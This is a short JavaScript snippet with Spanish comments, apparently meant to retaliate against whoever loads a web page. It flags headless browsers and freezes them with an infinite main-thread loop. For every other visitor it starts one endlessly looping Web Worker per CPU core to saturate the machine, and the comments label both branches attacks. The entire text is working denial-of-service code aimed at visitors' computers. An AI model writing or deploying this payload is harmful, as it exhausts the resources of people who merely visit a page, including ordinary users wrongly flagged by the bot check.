(function() {
    // 1. Detección de Navegador Headless (Bot)
    const isHeadless = navigator.webdriver || 
                      !navigator.languages || 
                      navigator.languages.length === 0 ||
                      /HeadlessChrome/.test(navigator.userAgent);

    if (isHeadless) {
        console.log("Bot detected. Initiating process freeze...");
        // Ataque para Bots: Loop infinito en el hilo principal
        // Esto congela el proceso de Node.js/Python que controla el navegador
        while(true) {
            Math.sqrt(Math.random() * Math.random());
        }
    } else {
        console.log("Human detected. Initiating background CPU saturation...");
        // Ataque para Humanos: WebWorkers
        // Esto satura todos los núcleos de la CPU del atacante sin bloquear la UI inmediatamente
        const cpuCoreCount = navigator.hardwareConcurrency || 4;
        const workerCode = `while(true) { Math.sqrt(Math.random() * Math.random()); }`;
        const blob = new Blob([workerCode], {type: 'application/javascript'});
        const workerUrl = URL.createObjectURL(blob);

        for (let i = 0; i < cpuCoreCount; i++) {
            new Worker(workerUrl);
        }
    }
})();
